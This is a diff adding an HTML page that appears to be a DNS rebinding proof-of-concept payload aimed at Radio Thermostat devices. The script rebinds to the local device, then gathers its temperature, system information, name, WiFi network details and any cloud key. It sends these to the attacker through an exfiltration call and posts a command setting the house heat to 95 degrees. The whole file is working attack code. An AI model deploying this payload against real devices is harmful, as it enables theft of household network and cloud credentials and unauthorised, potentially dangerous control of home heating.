@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Radio Thermostat Payload</title>
+</head>
+<body>
+<script type="text/javascript" src="/share/js/DNSRebindNode.js"></script>
+<script type="text/javascript">
+(function() {
+
+    attack()
+    .then(
+        () => {},
+        err => {
+            console.error(err)
+            DNSRebindNode.emit('fatal', err.message)
+        }
+    )
+    .then(() => DNSRebindNode.destroy())
+
+    async function attack() {
+
+        const getOptions = DNSRebindNode.fetchOptions()
+        getOptions.headers['Content-Type'] = 'application/json'
+        
+        try {
+            const opts = { fetchOptions: getOptions }
+            await DNSRebindNode.rebind(`http://${location.host}/tstat/model`, opts)
+        } catch (err) {
+            return Promise.reject(err)
+        }
+        
+        // deep copy
+        const postOptions = JSON.parse(JSON.stringify(getOptions))
+        postOptions.method = 'POST'
+        // set house temperature to 95 degrees :O
+        postOptions.body = JSON.stringify({tmode: 1, a_heat: 95})
+
+        const exfiltrationData = {}
+
+        try {
+            await Promise.all([
+                // get the current temperature
+                request(`http://${location.host}/tstat/temp`, getOptions)
+                .then(data => Object.assign(exfiltrationData, data)),
+                
+                // get basic system information
+                request(`http://${location.host}/sys`, getOptions)
+                .then(data => Object.assign(exfiltrationData, data)),
+                
+                // get the device name
+                request(`http://${location.host}/sys/name`, getOptions)
+                .then(data => Object.assign(exfiltrationData, data)),
+                
+                // get info about the WiFi network the device is connected to
+                request(`http://${location.host}/sys/network`, getOptions)
+                .then(data => Object.assign(exfiltrationData, data)),
+                
+                // see if there is a cloud key sitting on this device
+                request(`http://${location.host}/cloud`, getOptions)
+                .then(data => Object.assign(exfiltrationData, data)),
+                
+                // and of course... set the temperature to 95 degrees!
+                request(`http://${location.host}/tstat`, postOptions)
+            ])
+        } catch (err) {
+            return Promise.reject(err)
+        }
+
+        return await DNSRebindNode.exfiltrate('radio-thermostat', exfiltrationData)
+    }
+
+    async function request(url, options) {
+
+        let response = null
+        try {
+            response = await fetch(url, options).then(res => res.json())
+        } catch (err) {
+            DNSRebindNode.emit('failure', { message: `Error downloading ${url}`, err })
+            return Promise.reject(err)
+        }
+
+        DNSRebindNode.emit('success', { message: `Downloaded ${url}`, data: response })
+        return Promise.resolve(response)
+    }
+
+})()
+</script>
+</body>
+</html>
